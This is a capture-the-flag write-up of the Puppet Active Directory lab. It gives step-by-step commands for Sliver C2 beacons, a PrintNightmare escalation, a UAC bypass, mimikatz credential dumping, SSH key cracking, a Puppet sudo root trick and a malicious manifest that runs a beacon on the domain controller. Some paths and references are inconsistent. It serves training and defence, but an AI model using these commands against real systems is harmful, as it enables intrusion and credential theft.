```markdown
# Puppet Pro Lab Writeup

**Platform**: HTB / Vulnlab  
**Difficulty**: Advanced  
**Category**: Active Directory / Sliver C2 Operations / Red Team  
**Flags**: 4/4  
**Author**: razzle_mouse

---

## Lab Infrastructure

| Machine          | OS                          |
|------------------|-----------------------------|
| PUPPET-PM01      | Linux (Puppet Master)       |
| PUPPET-DC01      | Windows (Domain Controller) |
| PUPPET-FILE01    | Windows (File Server)       |

---

## Synopsis

Puppet is a multi-stage Active Directory penetration testing lab that simulates a real-world hybrid environment — Windows file servers, Linux infrastructure automation, and a domain controller — all tied together by Puppet configuration management.

The attack chain doesn’t require exotic exploits; it’s built on five ordinary failures that, when chained together, hand over domain admin credentials:

- A C2 framework configured insecurely
- A privilege escalation vulnerability (PrintNightmare) left unpatched
- A service account exposed through credential dumping
- An SSH infrastructure trusted too readily
- An automation tool pointed at targets without proper isolation

None of these are zero-days. What makes them work end-to-end is that every component trusts something it shouldn’t.

---

## Attack Surface & Reconnaissance

### Target Layout

The engagement fronts a single gateway (`10.13.38.33` via FTP, `172.16.40.200` across the internal network):

- **File01** (`172.16.40.50`) — Windows file server, Puppet agent, contains initial beacon
- **Puppet Server** (`172.16.40.200`) — Linux Puppet master, controls File01 and DC01
- **DC01** (`172.16.40.5`) — Domain controller, final target

---

### Initial Enumeration

Port scan of the FTP gateway:

```bash
rustscan -b 500 -a 10.13.38.33  -- -sC -sV -Pn
```

**Results**:

```
PORT      STATE SERVICE        REASON         VERSION
21/tcp    open  ftp            syn-ack ttl 63 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw----r--    1 0        0            2119 Oct 11  2024 red_127.0.0.1.cfg
|_-rwxr-xr-x    1 0        0        36515304 Oct 12  2024 sliver-client_linux
22/tcp    open  ssh            syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11
8140/tcp  open  ssl/http       syn-ack ttl 63 WEBrick httpd 1.7.0 (Ruby 3.0.2)
8443/tcp  open  ssl/https-alt? syn-ack ttl 63
31337/tcp open  ssl/Elite?     syn-ack ttl 63
```

**Key Findings**:

- `21/tcp` — vsftpd 3.0.5 (anonymous FTP enabled)
- `22/tcp` — OpenSSH
- `8443/tcp` — Sliver C2 server (HTTPS)
- `31337/tcp` — Elite (C2 port)

---

### FTP Discovery

Anonymous FTP access revealed two critical files:

```bash
ftp 10.13.38.33
# Anonymous login successful
# Files found:
#   - red_127.0.0.1.cfg (Sliver client configuration)
#   - sliver-client_linux (Sliver C2 binary)

ftp> mget red_127.0.0.1.cfg sliver-client_linux
```

**Key Finding**: The configuration file contained hardcoded `localhost:31337`, indicating the C2 server was not internet-facing — a significant operational security issue that would later become exploitable.

---

## Flag 1: Sleep — Initial Access via C2

### Challenge

The Sliver config pointed to localhost, but we needed remote access. Standard port-forwarding was required to establish the C2 channel.

### Exploitation

**Step 1**: Set up socat relay from attack machine to internal C2 server

```bash
sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
```

**Step 2**: Import the configuration and connect to Sliver

```bash
./sliver-client_linux import ./red_127.0.0.1.cfg
```

**Step 3**: Interact with the existing beacon on File01

```bash
beacons
# Output shows active beacon as PUPPET\bruce.smith on File01

use <Beacon_ID>
interactive
session
use <Session_ID>
```

**Step 4**: AD Enumeration with SharpHound

```bash
cd c:\\temp
sharp-hound-4 -s -t 300 -- -c all,gpolocalgroup
download 20241017043355_BloodHound.zip
```

Loaded the zip into BloodHound locally — no interesting attack paths found from `bruce.smith`’s context.

**Step 5**: ADCS Enumeration

```bash
sa-adcs-enum
# [*] Found 0 CAs in the domain
```

No certificate authority in the domain — ADCS attacks ruled out.

**Step 6**: Internal Network Ports

```bash
sa-netstat
# [*] Successfully executed sa-netstat (coff-loader)
# Processing: 14 Entries
#   TCP  10.13.38.33:50522    172.16.40.50:8443     ESTABLISHED
#   UDP  127.0.0.1:52613        *:*                 C:\ProgramData\Puppet\puppet-update.exe
```

Confirmed the beacon process (`puppet-update.exe`) was the only outbound connection — to the C2 server on port 8443.

**Step 7**: Locate the first flag

```bash
execute -o -- cmd.exe /c dir "C:\Users\Bruce.Smith\Desktop"
execute -o -- cmd.exe /c type "C:\Users\Bruce.Smith\Desktop\flag.txt"
```

**Flag 1 Retrieved**:

```
PUPPET{1c1740d66f7071xxxxxxxxxxxxxxxxxxxx}
```

### Key Lesson

Hardcoded C2 credentials in configuration files, even “internal” ones, become a liability the moment they’re copied to untrusted endpoints. The FTP server’s anonymous access policy amplified this — any attacker with network visibility could obtain the keys to the kingdom.

---

## Flag 2: Nightmare — PrintNightmare LPE on File01

### Challenge

The initial beacon ran as a regular domain user (`PUPPET\bruce.smith`) with no special privileges. Dumping credentials or accessing restricted resources required SYSTEM or higher.

### Discovery: Vulnerability Assessment

Ran `PrivescCheck` to enumerate local privilege escalation vectors:

```bash
sharpsh -t 300 -- -c invoke-privesccheck -u c:\\temp\\PrivescCheck.ps1
```

**Critical Finding**:

```
Policy: Limits print driver installation to Administrators
  Key: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
  Value: RestrictDriverInstallationToAdministrators = 0
  Status: Vulnerable — High Severity

Policy: Point and Print > NoWarningNoElevationOnInstall = 1
  Description: This reintroduces PrintNightmare (CVE-2021-34527)
```

### Exploitation: PrintNightmare (CVE-2021–1675)

**Step 1**: Upload the exploit

```bash
upload /path/to/CVE-2021-1675.ps1 c:\users\public\CVE-2021-1675.ps1
```

**Step 2**: Execute the exploit to create a local admin user

```bash
execute -o -- powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ". c:\temp\CVE-2021-34527.ps1; Invoke-Nightmare -NewUser adm1n -NewPassword P@ssw0rd"
```

**Output**:

```
[+] created payload at C:\Users\bruce.smith\AppData\Local\Temp\nightmare.dll
[+] added user adm1n as local administrator
[+] deleting payload
```

**Step 3**: Spawn a beacon as the new admin user

```bash
runas -u adm1n -P "P@ssw0rd" -p "C:\ProgramData\Puppet\puppet-update.exe"
```

**Result**: New beacon with local admin privileges

### UAC Bypass to SYSTEM

**Step 1**: Compile `SspiUacBypass`

```bash
cd ~/.sliver-client/extensions/UAC-BOF-Bonanza/SspiUacBypass
make
```

**Step 2**: Upload and execute

```bash
upload /home/kali/.sliver-client/extensions/UAC-BOF-Bonanza/SspiUacBypass/bin/standalone/SspiUacBypass.exe "c:\temp\SspiUacBypass.exe"

execute -o -- "c:\temp\SspiUacBypass.exe" "c:\programdata\puppet\puppet-update.exe"
```

**Result**: SYSTEM beacon (`NT AUTHORITY\SYSTEM`)

### Credential Dumping

With SYSTEM privileges:

```bash
mimikatz privilege::debug sekurlsa::logonpasswords exit
```

**Credentials Extracted**:

- `svc_puppet_win_t1` — NTLM: `784c7b5105....`
- `bruce.smith` — NTLM: `adca4e5100da.....`
- `FILE01$` (machine account) — NTLM: `f7a69c8..........`

**Flag 2 Retrieved**:

```
PUPPET{3b3072985cxxxxxxxxxxxxxxxxxxxxxxx}
```

### Key Lesson

PrintNightmare works because administrators trust the driver installation pipeline — a user shouldn’t be able to install drivers without elevation. When that policy is disabled and the “warn on elevation” policy is also disabled, the attack becomes trivial. The lesson isn’t just “patch PrintNightmare” — it’s “verify your printer policies actually match your intent.”

---

## Flag 3: Dance — Lateral Movement via Service Account

### Challenge

Dumped credentials alone don’t move the needle without a path to use them. The extracted `svc_puppet_win_t1` account runs the Puppet service — valuable for lateral movement within File01, but we needed access to the DC.

### Migrate to Service Process

**Step 1**: Identify the Puppet service process

```bash
ps
# Found: PID 1196 — ruby.exe running as PUPPET\svc_puppet_win_t1
```

**Step 2**: Migrate the beacon into the service process

```bash
migrate -p 1196
```

This moves the beacon’s context to run as the service account without needing a new logon event.

### Access DC’s IT Share

From the service account context:

```bash
# Domain IPs extraction
execute -o -- arp -a

# Enumeration of file shares
sa-netshares dc01

ls \\\\dc01.puppet.vl\\it
# Output:
#   .ssh/ (directory)
#   Autologon64.exe
#   PsExec64.exe
#   firewalls/ (directory)

ls \\\\dc01.puppet.vl\\it\\.ssh
# Output:
#   ed25519 (SSH private key, 472 bytes)
#   ed25519.pub
```

### Download SSH Key

```bash
download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519
```

The file was encrypted with a passphrase — not plaintext, but crackable.

### Crack SSH Key Passphrase

On the attack machine:

```bash
ssh2john ed25519 > ed25519.hash
john ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Output:
john --show ed25519.hash
# ed25519:xxxxxxxxxxxxxxxx
```

**Passphrase**: `xxxxxxxxxxxxxxxx`

### SSH Access to Puppet Server

Set up port forwarding through the Sliver beacon:

```bash
portfwd add --bind 2222 -r 172.16.40.200:22
```

Connect via SSH:

```bash
ssh -i ed25519 -p 2222 "svc_puppet_lin_t1@puppet.vl"@127.0.0.1
# Passphrase: xxxxxxxxxxxxxx
```

### Privilege Escalation on Puppet Server

Check sudo permissions:

```bash
sudo -l
# User svc_puppet_lin_t1@puppet.vl may run the following commands on puppet:
#     (ALL) NOPASSWD: /usr/bin/puppet
```

Exploit Puppet itself for privilege escalation:

```bash
sudo puppet apply -e "exec { '/bin/sh -c \"chmod u+s /bin/bash\"': }"
bash -p
# id: uid=451001132(...) euid=0(root)
```

**Result**: Root access on puppet server

### Locate Flag

```bash
find / -name "flag.txt" 2>/dev/null
cat /root/flag.txt
```

**Flag 3 Retrieved**:

```
PUPPET{c093xxxxxxxxxxxxxxxxxxx}
```

### Key Lesson

The Puppet server’s configuration allowed the service account unlimited sudo access to the puppet binary itself — a privilege escalation primitive wrapped in infrastructure automation. The lesson parallels the mass-assignment bug: when you hand a tool permission to modify system configuration without restriction, you’ve handed someone a path to root.

---

## Flag 4: Puppet Master — DC Compromise via Infrastructure Automation

### Challenge

We had root on the Puppet server, but the goal was the domain controller. Puppet itself controls the DC — it pushes configurations to it regularly. We could weaponize that.

### Create Malicious Puppet Manifest

**Step 1**: Create the manifest directory structure

```bash
mkdir -p /etc/puppet/code/environments/production/manifests
```

**Step 2**: Write a manifest that executes our beacon on DC01

```bash
cat > /etc/puppet/code/environments/production/manifests/site.pp << 'EOF'
node 'dc01.puppet.vl' {
  exec { 'pwned':
    command   => 'C:\\Windows\\System32\\cmd.exe /c \\\\file01.puppet.vl\\files\\update.exe',
    logoutput => true,
  }
}
node default {
  notify { 'This is the default node': }
}
EOF
```

This manifest tells the DC01 agent to execute a binary from the File01 share — our next Sliver beacon.

### Generate DC Beacon

Back in Sliver:

```bash
generate beacon --mtls 172.16.40.200:8443 --os windows --arch amd64 --save /tmp/update.exe
```

### Upload Beacon to File01 Share

```bash
use 18b16445  # svc_puppet_win_t1 session
upload /tmp/update.exe \\\\file01.puppet.vl\\files\\update.exe
```

### DC Agent Check-in

The Puppet agent on DC01 checks in every minute (configured in the lab to speed up exploitation). After the manifest was modified, the agent applied the catalog and executed our beacon:

```bash
beacons
# New beacon appears:
# [*] Beacon c2728189 FORTUNATE_BOSOM - 172.16.40.5:59457 (DC01)
```

### Dump DC Credentials

The root flag was stored in a SYSTEM-protected DPAPI credential, not a user credential. This meant it could only be decrypted with the machine’s `DPAPI_SYSTEM` key, which is only accessible to processes running as SYSTEM.

Using `SharpDPAPI` to extract SYSTEM-level credentials:

```bash
upload /home/kali/tools/SharpCollection/NetFramework_4.7_x64/SharpDPAPI.exe c:\users\public\SharpDPAPI.exe

execute -o -- "c:\users\public\SharpDPAPI.exe" machinetriage
```

**Output revealed**:

```
Folder: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

CredFile: 39FAB9BA3A19E88594B1D50B5E44AAA4
  TargetName: Domain:batch=TaskScheduler:Task:{ACFD7F3B-51A4-4B11-8428-F287E956EC4C}
  UserName: PUPPET\root
  Credential: PUPPET{8b6626xxxxxxxxxxxxxxx}
```

**Flag 4 Retrieved**:

```
PUPPET{8b6xxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

---

## All Flags

| #   | Flag                                      | Vulnerability                                      | Machine          |
|-----|-------------------------------------------|----------------------------------------------------|------------------|
| 1   | `PUPPET{1c1740...}`                       | Hardcoded C2 config via anonymous FTP              | PUPPET-FILE01    |
| 2   | `PUPPET{3b30...}`                         | PrintNightmare (CVE-2021-1675) LPE                 | PUPPET-FILE01    |
| 3   | `PUPPET{c09...}`                          | Puppet sudo misconfiguration → root                | PUPPET-PM01      |
| 4   | `PUPPET{8b6626...}`                       | Malicious Puppet manifest → DC compromise → DPAPI  | PUPPET-DC01      |

---

## Tools Used

| Tool                         | Purpose                                                      |
|------------------------------|--------------------------------------------------------------|
| Sliver C2                    | Command and control framework for beacon management          |
| SharpHound                   | Active Directory enumeration and BloodHound data collection  |
| PrivescCheck                 | Local privilege escalation vulnerability assessment          |
| Mimikatz                     | Credential dumping from LSASS memory                         |
| SharpDPAPI                   | DPAPI credential extraction from machine context             |
| SspiUacBypass                | UAC bypass via SSPI Datagram Contexts                        |
| socat                        | TCP port forwarding to tunnel C2 traffic                     |
| ssh2john / john              | SSH private key passphrase cracking                          |
| PrintNightmare (CVE-2021-1675) | Local privilege escalation via print spooler               |

---

## Key Takeaways

- **Hardcoded C2 credentials in config files are a liability** — anonymous FTP access combined with a localhost-bound Sliver config handed over the keys to the entire engagement before a single exploit was run.

- **PrintNightmare is still alive in misconfigured environments** — two registry keys set incorrectly reintroduce a fully patched vulnerability. Policy intent and policy reality are not the same thing.

- **Service accounts are lateral movement bridges** — `svc_puppet_win_t1` running the Puppet service on File01 had access to the DC's IT share. Migrating into that process required no new credentials, no new logon event.

- **Infrastructure automation tools are force-multipliers for attackers** — Puppet, Ansible, Chef all assume the right to run commands on targets. Compromising the master compromises everything it manages.

- **The chain didn’t need a single catastrophic bug** — five ordinary failures stacked across trusted components handed over domain admin credentials end to end.

---

## Wrap-Up

Puppet earns its synopsis: nothing in this range is a zero-day, and nothing required exotic tooling. What made it work end to end was that every component trusted something it shouldn’t have:

- The FTP server trusted that anonymous access to C2 configuration was harmless.
- File01 trusted that printer driver installation policies were correctly enforced.
- The service account trusted that its SSH keys were safely stored.
- The Puppet master trusted that only legitimate manifests would ever reach it.
- DC01 trusted that every catalog the Puppet master pushed was benign.

None of these are advanced techniques. They’re the everyday configuration failures and trust assumptions that show up in real enterprise environments — on a target built specifically to make the point: when automation infrastructure sits inside your production AD environment without proper isolation, a single compromised endpoint becomes a path to domain admin.

---

## ⚠️ Connection Issues

**Note**: There is a connection instability issue. The SSH connection via `portfwd` (`127.0.0.1:2222`) frequently resets or times out. This appears to be related to network latency or firewall restrictions, not a problem with the SSH key or credentials.

**Symptoms**:
- `Connection reset by peer`
- `kex_exchange_identification: read: Connection reset by peer`
- SSH stalls after `Connection established`

**Workarounds**:
- Use `ssh -v` to debug.
- Retry multiple times.
- Use WinRM as an alternative if available.

---

#CyberSecurity #CTF #HackTheBox #Writeup #PenetrationTesting #ActiveDirectory #RedTeam #SliverC2 #PrintNightmare #LateralMovement #PrivilegeEscalation #CredentialDumping #Mimikatz #Puppet #InfrastructureSecurity #C2Operations #CTFWriteup #EthicalHacking #SecurityResearch
```
